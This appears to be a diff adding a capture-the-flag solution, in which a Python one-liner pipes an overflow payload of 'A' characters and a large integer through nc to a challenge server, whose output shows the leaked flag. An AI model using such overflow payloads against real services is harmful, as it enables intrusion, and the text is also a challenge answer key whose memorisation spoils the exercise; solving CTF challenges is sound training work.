@@ -1,0 +1,2 @@
+$ python -c 'print "A"*50 + "XXXX\n" + "4294967296\n" ' | nc problems.ctfx.io 1338
+Enter your text: Guess the length of this text: The actual length of 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAXX���ctf(hiding_behind_a_null_overwrite)' is 91, not 2147483647. Sorry :(
